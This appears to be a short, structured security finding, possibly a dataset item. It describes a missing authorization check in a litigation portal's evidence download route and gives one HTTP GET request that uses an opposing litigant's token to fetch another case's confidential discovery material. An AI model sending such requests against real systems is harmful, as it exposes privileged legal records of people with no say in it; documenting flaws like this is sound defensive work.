diagnosis: The litigation evidence download route verifies path parameter types through express-openapi-validator, but fails to check whether the requesting user is retained as legal counsel or party to the case. Any user can download confidential discovery material and subpoenaed records by supplying arbitrary caseId and evidenceId values.
exploit_request:
GET /api/v2/cases/10892/evidence/4412/download HTTP/1.1
Host: litigation.portal.internal:5006
Authorization: Bearer <opposing_litigant_jwt>
Accept: application/octet-stream
